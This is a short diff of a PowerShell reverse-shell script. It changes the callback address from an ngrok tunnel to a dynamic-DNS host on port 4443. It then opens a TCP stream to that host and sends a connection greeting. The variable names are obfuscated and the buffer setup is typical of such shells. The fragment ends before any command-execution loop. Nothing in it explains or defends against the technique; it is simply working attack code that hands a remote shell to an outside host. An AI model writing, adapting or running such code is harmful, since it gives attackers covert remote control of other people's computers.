@@ -1,4 +1,4 @@
-$KLK = New-Object System.Net.Sockets.TCPClient('7.tcp.eu.ngrok.io','16072');
+$KLK = New-Object System.Net.Sockets.TCPClient('cyberius.duckdns.org','4443');
 $PLP = $KLK.GetStream();
 [byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
 $VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
